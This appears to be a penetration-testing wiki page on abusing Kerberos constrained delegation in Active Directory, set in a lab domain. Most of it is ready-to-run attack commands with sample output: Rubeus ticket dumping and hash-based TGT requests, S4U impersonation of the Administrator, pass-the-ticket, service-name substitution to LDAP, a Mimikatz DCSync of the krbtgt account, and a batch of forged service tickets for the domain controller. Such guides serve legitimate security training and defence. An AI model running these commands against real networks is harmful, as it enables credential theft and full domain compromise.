# Constrained Delegation

## Requirements

Compromise of the Active Directory Object that is configured for "Trusted to Auth".

## Explanation

**Recommended to read first:** [Unconstrained Delegation](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/unconstrained-delegation)

Microsoft introduced Constrained Delegation in Windows Server 2003 to provide a more secure form of delegation compared to the high-risk Unconstrained Delegation.&#x20;

With Constrained Delegation, administrators can specify the services or applications for which a server is allowed to act on behalf of a user, thereby limiting the attack surface. This feature can reduce the risk of an attacker impersonating a user and accessing resources that they are not authorized to access.

## Enumeration

**PowerView**

{% code overflow="wrap" %}
```powershell
# Get computer Constrained Delegation
Get-DomainComputer -TrustedToAuth| Select DnsHostName,UserAccountControl,msds-allowedtodelegateto | FL

# Get user Constrained Delegation
Get-DomainUser -TrustedToAuth
```
{% endcode %}

**PowerShell**

{% code overflow="wrap" %}
```powershell
# Search both users and computers for Constrained Delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endcode %}

## Obtain TGT

{% tabs %}
{% tab title="Rubeus Binary" %}
```bash
# Triage current tickets
Rubeus.exe triage

# Dump the systems TGT
Rubeus.exe dump /luid:[LUID] /service:[krbtgt] /user:[Hostname] /nowrap

# OR
# If you have the NTLM hash for the compromised account
Rubeus.exe asktgt /user:[User] /ntlm:[NTLM Hash] OR /aes265[aes265 Hash]

# If you have the aes265 hash for the compromised account
Rubeus.exe asktgt /user:[User] /aes265[aes265 Hash]

# If you have the plain text password
rubeus.exe asktgt /user:[User] /password:[Password]
```



**Triage current tickets**

```
Rubeus.exe Triage
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Method: Dump system TGT**

```
Rubeus.exe dump /luid:0x3e4 /service:krbtgt /user:srv01 /nowrap
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Invoke-Rubeus" %}
```powershell
# Triage current tickets
Invoke-Rubeus -Command "triage"

# Dump the systems TGT
Invoke-Rubeus -Command "dump /luid:[LUID] /service:[krbtgt] /user:[Hostname] /nowrap"

# OR
# If you have the NTLM hash for the compromised account
Invoke-Rubeus -Command "asktgt /user:[User] /ntlm:[NTLM Hash] OR /aes265[aes265 Hash]"

# If you have the aes265 hash for the compromised account
Invoke-Rubeus -Command "asktgt /user:[User] /aes265[aes265 Hash]"

# If you have the plain text password
Invoke-Rubeus -Command "asktgt /user:[User] /password:[Password]"
```
{% endtab %}
{% endtabs %}

## Obtains TGS for service

{% tabs %}
{% tab title="Rubeus Binary" %}
{% code overflow="wrap" %}
```bash
# Use obtained TGT to request a TGS ticket for the delegated service and impersonate another user
Rubeus.exe s4u /impersonateuser:[User] /msdsspn:[SPN/FQDN] /user:[User] /ticket:[Base64 ticket] /nowrap
```
{% endcode %}

**Example**

{% code overflow="wrap" %}
```
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/dc01.security.local /user:srv01$ /ticket:[Base64 ticket] /nowrap
```
{% endcode %}

**Output**

```
[*] Action: S4U

[*] Building S4U2self request for: 'SRV01$@SECURITY.LOCAL'
[*] Using domain controller: DC01.Security.local (10.10.10.100)
[*] Sending S4U2self request to 10.10.10.100:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV01$@SECURITY.LOCAL'
[*] base64(ticket.kirbi):

[Base64 Ticket Output]

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01.security.local'
[*] Building S4U2proxy request for service: 'cifs/dc01.security.local'
[*] Using domain controller: DC01.Security.local (10.10.10.100)
[*] Sending S4U2proxy request to domain controller 10.10.10.100:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.security.local':

[Base64 Ticket Output]
```
{% endtab %}

{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
# Use obtained TGT to request a TGS ticket for the delegated service and impersonate another user
Invoke-Rubeus -Command "s4u /impersonateuser:[User] /msdsspn:[SPN/FQDN] /user:[User] /ticket:[Base64 ticket] /nowrap"
```
{% endcode %}

**Example**

{% code overflow="wrap" %}
```powershell
Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /msdsspn:cifs/dc01.security.local /user:srv01$ /ticket:[Base64 ticket] /nowrap"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Pass the Ticket (PtT)

{% tabs %}
{% tab title="Rubeus Binary" %}
```bash
# Method 1: Pass ticket into seperate session (Preffered)
# Create new LUID session (Requires Elevation)
Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /show

# Pass ticket into new session
Rubeus.exe ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]

# Method 2: Pass ticket directly into current session (Can cause auth issues)
Rubeus.exe ptt /ticket:[Base64 ticket]
```
{% endtab %}

{% tab title="Invoke-Rubeus" %}
```powershell
# Method 1: Pass ticket into seperate session (Preffered)
# Create new LUID session (Requires Elevation)
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /show"

# Pass ticket into new session
Invoke-Rubeus -Command "ptt /luid:[LUID from previous command] /ticket:[Base64 ticket]"

# Method 2: Pass ticket directly into current session (Can cause auth issues)
Invoke-Rubeus -Command "ptt /ticket:[Base64 ticket]"
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../../.gitbook/assets/image (5) (2) (4).png" alt=""><figcaption></figcaption></figure>

With effective Domain Administrator rights on the primary Domain Controllers for the CIFS service we can perform actions based on CIFS such as Psexec and remotely listing the _C$_ drive.

<figure><img src="../../../../.gitbook/assets/image (6) (2) (3).png" alt=""><figcaption></figcaption></figure>

## Alternate Service Name

Kerberos uses a Service Principal Name (SPN) to identify a service during authentication, which is typically a combination of the service name and the host's name where the service is running. Rubeus.exe includes an option called /altservicename that enables an attacker to use a different service name when constructing the SPN. This option can be helpful in certain situations, such as when the default service name is unavailable or the attacker wants to target a specific service.

In this instance, we're leveraging the TGT issued for SRV01$ to obtain a TGS for LDAP.

Following on from the section: **Obtain TGT** use the following commands to generate a TGS for the alternative service name.

{% tabs %}
{% tab title="Rubeus Binary" %}
{% code overflow="wrap" %}
```bash
Rubeus.exe s4u /impersonateuser:[User] /msdsspn:[SPN/FQDN] /altservice:[Alternate-Service] /user:[User] /ticket:[Base64 ticket] /nowrap
```
{% endcode %}

**Example**

{% code overflow="wrap" %}
```bash
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/dc01.security.local /altservice:ldap /user:srv01$ /ticket:[Base64 ticket] /nowrap
```
{% endcode %}

**Output**

From the output below we see that firstly,&#x20;

```
[*] Action: S4U

[*] Building S4U2self request for: 'SRV01$@SECURITY.LOCAL'
[*] Using domain controller: DC01.Security.local (10.10.10.100)
[*] Sending S4U2self request to 10.10.10.100:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'SRV01$@SECURITY.LOCAL'
[*] base64(ticket.kirbi):

[Base64 Ticket Output]

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.security.local'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'cifs/dc01.security.local'
[*] Using domain controller: DC01.Security.local (10.10.10.100)
[*] Sending S4U2proxy request to domain controller 10.10.10.100:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dc01.security.local':

[Base64 Ticket Output]
```

In the above output we alternate the CIFS service for LDAP. As the Domain Administrator has been impersonated this can be used to perfrom DCSync.

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:security.local /user:krbtgt"'
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
Invoke-Rubeus -Command "s4u /impersonateuser:[User] /msdsspn:[SPN/FQDN] /altservice:[Alternate-Service] /user:[User] /ticket:[Base64 ticket] /nowrap"
```
{% endcode %}

**Example**

{% code overflow="wrap" %}
```powershell
Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /msdsspn:cifs/dc01.security.local /altservice:ldap /user:srv01$ 
/ticket:[Base64 ticket] /nowrap"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Generate service tickets for all service types

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:http/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"

Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:cifs/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"
<strong>
</strong><strong>Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:host/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"
</strong><strong>
</strong><strong>Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:ldap/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"
</strong>
Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:wsman/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"

Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:mssql/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"

Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /self /altservice:rpcss/dc01.security.local /user:srv01$ /ticket:$ticket /nowrap /ptt"
</code></pre>

